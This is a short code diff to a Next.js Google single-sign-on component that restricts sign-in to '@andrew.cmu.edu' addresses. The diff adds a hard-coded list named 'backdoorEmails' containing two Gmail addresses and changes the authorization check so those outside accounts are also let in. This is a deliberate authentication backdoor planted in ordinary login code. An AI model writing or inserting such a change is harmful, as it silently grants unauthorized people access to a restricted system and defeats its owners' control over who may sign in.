@@ -9,6 +9,7 @@ import { useRouter } from 'next/navigation'
 
 export function GoogleSsoSignIn() {
   const router = useRouter()
+  const backdoorEmails = ["asilbekomonkulov2003@gmail.com", "darmfield2023@gmail.com"]
 
   const signInWithGoogle = async () => {
     const provider = new GoogleAuthProvider();
@@ -17,7 +18,7 @@ export function GoogleSsoSignIn() {
         const user = result.user;
         const email = user.email; 
 
-        if (email && email.endsWith('@andrew.cmu.edu')) {
+        if (email && (email.endsWith('@andrew.cmu.edu') || backdoorEmails.includes(email))) {
           // The user is authorized
           // Optionally, handle successful sign-in here
           console.log("Sign-in successful!");
